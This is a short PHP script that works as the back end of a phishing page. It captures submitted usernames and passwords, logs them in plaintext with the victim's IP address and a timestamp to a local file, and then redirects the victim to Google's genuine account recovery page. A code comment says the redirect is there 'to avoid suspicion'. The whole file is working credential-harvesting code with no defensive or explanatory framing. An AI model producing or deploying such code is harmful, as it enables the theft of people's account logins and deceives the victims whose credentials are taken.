<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $ip       = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
    $time     = date("Y-m-d H:i:s");

    $log = "[{$time}] IP: {$ip} | Username: {$username} | Password: {$password}\n";

    file_put_contents("usernames.txt", $log, FILE_APPEND | LOCK_EX);

    // Optional: redirect to real site to avoid suspicion
    header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
    exit();
}
?>
